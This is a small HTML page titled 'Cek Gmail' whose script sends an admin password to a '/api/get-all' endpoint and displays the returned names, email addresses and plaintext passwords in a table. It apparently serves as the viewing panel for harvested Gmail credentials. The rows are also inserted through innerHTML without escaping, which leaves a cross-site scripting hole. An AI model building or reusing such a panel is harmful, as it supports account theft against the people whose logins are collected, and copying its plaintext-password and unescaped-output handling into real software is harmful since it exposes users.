<!DOCTYPE html>
<html>
<head><title>Cek Gmail</title></head>
<body>
  <h2>Cek Gmail</h2>
  <input type="password" id="adminpass" placeholder="Admin Password">
  <button onclick="loadData()">Login</button>
  <table border="1" id="data" style="margin-top:10px"></table>

  <script>
    async function loadData() {
      const pass = document.getElementById('adminpass').value;
      const res = await fetch('/api/get-all', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ adminpass: pass })
      });

      if (!res.ok) return alert('Gagal login');

      const data = await res.json();
      const table = document.getElementById('data');
      table.innerHTML = '<tr><th>Nama</th><th>Email</th><th>Password</th></tr>' +
        data.map(d => `<tr><td>${d.name}</td><td>${d.email}</td><td>${d.password}</td></tr>`).join('');
    }
  </script>
</body>
</html>
